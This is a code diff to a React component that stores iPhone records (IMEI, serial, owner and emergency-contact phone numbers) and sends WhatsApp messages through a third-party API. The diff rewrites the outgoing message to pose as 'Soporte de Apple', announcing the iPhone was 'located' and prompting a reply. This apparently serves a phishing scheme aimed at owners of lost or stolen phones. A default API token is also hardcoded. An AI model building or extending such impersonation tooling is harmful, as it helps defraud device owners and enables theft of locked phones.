@@ -22,6 +22,7 @@ interface Process {
   status: string;
   created_at: string;
   updated_at: string;
+  user_id: string;
 }
 
 interface ProcessListProps {
@@ -56,11 +57,17 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
   const loadProcesses = async () => {
     try {
       setLoading(true);
-      console.log('Loading processes...');
+      console.log('Loading processes for userType:', userType);
       
       // Verificar sesión del usuario
       const { data: { session } } = await supabase.auth.getSession();
       console.log('Current session:', session?.user?.email);
+
+      if (!session) {
+        console.log('No session found');
+        setProcesses([]);
+        return;
+      }
 
       let query = supabase
         .from('processes')
@@ -69,22 +76,22 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
       // Si es usuario normal, solo mostrar sus procesos
       if (userType === 'user') {
-        const { data: { user } } = await supabase.auth.getUser();
-        if (user) {
-          query = query.eq('user_id', user.id);
-        }
+        console.log('Loading processes for user:', session.user.id);
+        query = query.eq('user_id', session.user.id);
+      } else {
+        console.log('Loading all processes for admin');
       }
 
       const { data, error } = await query;
       
-      console.log('Processes query result:', { data, error });
+      console.log('Processes query result:', { data, error, userType });
 
       if (error) {
         console.error('Error loading processes:', error);
         throw error;
       }
 
-      console.log('Processes loaded:', data);
+      console.log('Processes loaded:', data?.length || 0);
       setProcesses(data || []);
     } catch (error: any) {
       console.error('Error loading processes:', error);
@@ -152,22 +159,36 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       const instanceId = config?.whatsapp_instance || 'instance126876';
       const token = config?.whatsapp_token || '4ecj8581tubua7ry';
 
-      // Crear el mensaje personalizado
-      const message = `¡Hola ${process.client_name}! 📱
+      // Crear el mensaje personalizado según el tipo de contacto
+      let message = '';
+      
+      if (process.contact_type === 'propietario') {
+        message = `Soporte de Apple 👨🏽‍🔧
 
-Tu iPhone ${process.iphone_model} de ${process.storage} en color ${process.color} ha sido procesado exitosamente.
+✅ iPhone localizado con éxito
 
-📋 *Detalles del proceso:*
-• IMEI: ${process.imei}
-• Número de serie: ${process.serial_number}
-• Tipo de contacto: ${process.contact_type}
-${process.url ? `• URL: ${process.url}` : ''}
+📱 Modelo: ${process.iphone_model}
+💾 Almacenamiento: ${process.storage}
+🎨 Color: ${process.color}
+📟 IMEI: ${process.imei}
+🔑 Serie: ${process.serial_number}
 
-✅ Estado: Proceso completado
+🧾 Escribe la palabra Menu para solicitar asistencia.`;
+      } else {
+        message = `Soporte de Apple 👨🏽‍🔧
 
-¡Gracias por confiar en nosotros!
+🚨 Usted ha sido registrado como contacto de emergencia.
 
-*Equipo Astro505*`;
+✅ iPhone localizado con éxito
+
+📱 Modelo: ${process.iphone_model}
+💾 Almacenamiento: ${process.storage}
+🎨 Color: ${process.color}
+📟 IMEI: ${process.imei}
+🔑 Serie: ${process.serial_number}
+
+🧾 Escribe la palabra Menu para solicitar asistencia.`;
+      }
 
       // Enviar mensaje via WhatsApp API
       const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
@@ -252,7 +273,7 @@ ${process.url ? `• URL: ${process.url}` : ''}
     <div className="space-y-6">
       <div className="flex justify-between items-center">
         <h2 className="text-2xl font-bold text-blue-300">
-          Procesos Guardados ({processes.length})
+          {userType === 'admin' ? 'Todos los Procesos' : 'Mis Procesos'} ({processes.length})
         </h2>
         <Button
           onClick={loadProcesses}
@@ -270,7 +291,10 @@ ${process.url ? `• URL: ${process.url}` : ''}
             <div className="text-center">
               <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
               <p className="text-blue-200/50 text-sm">
-                Los procesos que agregues aparecerán aquí listos para enviar.
+                {userType === 'admin' 
+                  ? 'No hay procesos en el sistema o verifica tus permisos de administrador.'
+                  : 'Los procesos que agregues aparecerán aquí listos para enviar.'
+                }
               </p>
             </div>
           </CardContent>
@@ -284,7 +308,7 @@ ${process.url ? `• URL: ${process.url}` : ''}
                   <div>
                     <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                     <p className="text-blue-200/70 text-sm">
-                      {process.country_code} {process.phone_number}
+                      {process.country_code} {process.phone_number} ({process.contact_type})
                     </p>
                   </div>
                   <div className="flex items-center space-x-2">
